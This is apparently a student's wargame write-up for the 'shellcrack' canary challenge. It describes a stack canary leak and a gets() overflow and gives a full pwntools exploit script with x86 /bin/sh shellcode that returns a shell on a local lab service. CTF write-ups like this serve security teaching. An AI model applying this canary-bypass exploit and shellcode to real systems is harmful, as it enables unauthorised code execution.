ref: 5 | Canary 2 | shellcrack
===========================

General overview of problems faced
-------------------------------------
- I was having a hard time understanding why the canary was printing sometimes and wasn't at other times. I then realised it was because of how %s worked and that at times it was seeing a end of line and other times wasn't and therefore printed the canary after the buffer
- Took a few attempts to realise the canary was 8 bytes long

List of vulnerabilities
--------------------
1. The program can print out the canary if the user enter 16 chars of input as name. When attempting to print out the name of the user, the program will also print the canary.
2. The program uses a fixed buffer and takes inputs using gets. Therefore the buffer can overflow and it is possible to overwrite memory. Since we can get the canary from the above vulnerability, we can use that to bypass it.

Steps to exploit
------------------
1. Enter 16 bytes of non-null chars as input for the name
2. Save the returned canary
3. Save the given buffer pointer
4. Enter 23 bytes of NOP operators ('\x90') + 25 bytes of shellcode and then the 8 byte canary saved from [step 2]. Add an additional 20 bytes of data for the offset between the canary and the return address. And then add the pointer to your buffer in little endian format.
5. Congratulations! You now have a shell!

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

NOP_OPERATOR = '\x90'
SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
LEN_SHELL = len(SHELLCODE)

def main():
    target = "localhost"
    port = "6002"

    r = remote( target, port )
    r.send("A" * 16)
    r.recvuntil("This is the 9447 wargaming gateway, ")
    resp = r.recvline()

    canary = resp[16:-3].strip()

    print "low :", canary[:4].encode('hex')
    print "high :", canary[4:].encode('hex')

    high_canary = int(canary[:4].encode('hex'), 16)
    low_canary = int(canary[4:].encode('hex'), 16)

    r.recvuntil("the buffer[")
    buf = int(r.recvline()[:-3].strip(), 16)
    buf_len = 48
    offset = 20 # 0xffffd5cc - 0xffffd5b0 = 28 (20 offset + 8 canary)

    r.sendline(
        NOP_OPERATOR * (buf_len - LEN_SHELL)
        + SHELLCODE
        + p32(high_canary, endian='big')
        + p32(low_canary, endian='big')
        + NOP_OPERATOR * offset
        + p32(buf)
    )

    r.interactive()

if __name__ == '__main__':
    main()
```
